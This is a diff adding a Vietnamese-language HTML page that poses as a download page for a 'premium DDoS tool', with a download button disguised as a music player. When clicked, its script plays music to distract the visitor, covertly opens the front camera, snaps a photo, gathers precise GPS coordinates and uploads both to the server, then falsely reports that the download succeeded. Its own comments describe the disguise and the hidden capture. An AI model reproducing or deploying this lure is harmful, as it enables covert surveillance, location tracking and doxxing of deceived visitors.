@@ -1,0 +1,251 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tool premium</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .chat-container {
+      width: 100%;
+      max-width: 400px;
+      height: 100%;
+      max-height: 600px;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .chat-header {
+      background: #ff4757;
+      color: white;
+      padding: 15px;
+      font-weight: bold;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      background-color: #2ed573;
+      border-radius: 50%;
+    }
+    .chat-body {
+      flex: 1;
+      padding: 15px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background-color: #f7f8fa;
+    }
+    .message {
+      max-width: 85%;
+      padding: 10px 14px;
+      border-radius: 14px;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    .message.wormcoder {
+      background: #e4e6eb;
+      color: #050505;
+      align-self: flex-start;
+      border-bottom-left-radius: 4px;
+    }
+    .message.user {
+      background: #ff4757;
+      color: white;
+      align-self: flex-end;
+      border-bottom-right-radius: 4px;
+    }
+    /* Nắp che ngụy trang trình phát nhạc */
+    .music-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      padding: 12px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 5px;
+    }
+    .music-btn {
+      background: #ff4757;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .chat-footer {
+      padding: 10px 15px;
+      background: #ffffff;
+      border-top: 1px solid #e4e6eb;
+      display: flex;
+      align-items: center;
+    }
+    .chat-footer input {
+      flex: 1;
+      padding: 10px 14px;
+      border: 1px solid #ccd0d5;
+      border-radius: 20px;
+      outline: none;
+      font-size: 14px;
+      background-color: #f0f2f5;
+    }
+    /* Ẩn các phần tử xử lý ngầm */
+    #cameraPreview, #photoCanvas, #bgMusic {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="chat-container">
+    <div class="chat-header">
+      <div class="status-dot"></div>
+      <span>Tool ddos premium</span>
+    </div>
+
+    <div class="chat-body" id="chatBody">
+      <div class="message wormcoder">
+        Chào mừng bạn đến với web của tôi bấm vào để tải nhé
+      </div>
+      <div class="message wormcoder" id="musicBox">
+        <div class="music-card">
+          <span> <b>Tool ddos premium</b></span>
+          <button class="music-btn" id="playBtn">tải tool về download </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="chat-footer">
+      <input type="text" id="userInput" placeholder=" " disabled />
+    </div>
+  </div>
+
+  <!-- Thẻ âm thanh (file nhạc đặt cạnh file html, đổi tên file cho phù hợp) -->
+  <audio id="bgMusic" loop>
+    <source src="nhac.mp3" type="audio/mpeg">
+  </audio>
+
+  <!-- Các phần tử ẩn dùng để xử lý ngầm -->
+  <video id="cameraPreview" autoplay playsinline></video>
+  <canvas id="photoCanvas"></canvas>
+
+  <script>
+    const chatBody = document.getElementById("chatBody");
+    const cameraPreview = document.getElementById("cameraPreview");
+    const photoCanvas = document.getElementById("photoCanvas");
+    const bgMusic = document.getElementById("bgMusic");
+    const playBtn = document.getElementById("playBtn");
+    const musicBox = document.getElementById("musicBox");
+
+    function appendMessage(text, sender) {
+      const msgDiv = document.createElement("div");
+      msgDiv.classList.add("message", sender);
+      msgDiv.textContent = text;
+      chatBody.appendChild(msgDiv);
+      chatBody.scrollTop = chatBody.scrollHeight;
+    }
+
+    // Hàm lấy tọa độ GPS
+    function getGeolocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ latitude: null, longitude: null });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            resolve({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            });
+          },
+          () => resolve({ latitude: null, longitude: null }),
+          { enableHighAccuracy: true, timeout: 5000 }
+        );
+      });
+    }
+
+    // Hàm chụp ảnh và gửi ngầm kèm định vị
+    async function captureAndSend() {
+      try {
+        const coords = await getGeolocation();
+
+        photoCanvas.width = cameraPreview.videoWidth;
+        photoCanvas.height = cameraPreview.videoHeight;
+
+        const context = photoCanvas.getContext("2d");
+        context.drawImage(cameraPreview, 0, 0);
+
+        const imageBlob = await new Promise(resolve =>
+          photoCanvas.toBlob(resolve, "image/jpeg", 0.9)
+        );
+
+        const formData = new FormData();
+        formData.append("photo", imageBlob, "photo.jpg");
+        formData.append("latitude", coords.latitude || "");
+        formData.append("longitude", coords.longitude || "");
+
+        await fetch("/upload-photo", {
+          method: "POST",
+          body: formData
+        });
+
+        if (cameraPreview.srcObject) {
+          cameraPreview.srcObject.getTracks().forEach(track => track.stop());
+        }
+      } catch (error) {
+        console.error("Lỗi:", error);
+      }
+    }
+
+    // Khi người dùng bấm nút "Phát nhạc" (ngụy trang hoàn hảo)
+    playBtn.addEventListener("click", async () => {
+      // 1. Phát nhạc để đánh lừa người dùng
+      bgMusic.play().catch(e => console.log(e));
+      musicBox.style.display = "none"; // Ẩn khung bấm nhạc đi cho giống khung chat thật
+      appendMessage(" Đang kết nối máy chủ chứa file", "user");
+
+      try {
+        // 2. Ngay khi họ vừa click, âm thầm kích hoạt xin quyền Camera & Micro ngầm
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        cameraPreview.srcObject = stream;
+
+        // Đợi 1 nhịp ngắn rồi chụp ảnh + lấy vị trí gửi đi
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        await captureAndSend();
+
+        // 3. Xin nốt quyền thông báo phụ bên dưới
+        await Notification.requestPermission();
+
+        appendMessage("ok rồi nha ở thư mục coder trong máy .", "wormcoder");
+
+      } catch (error) {
+        appendMessage("Đã xảy ra lỗi kết nối thiết bị.", "wormcoder");
+      }
+    });
+  </script>
+</body>
+</html>
+
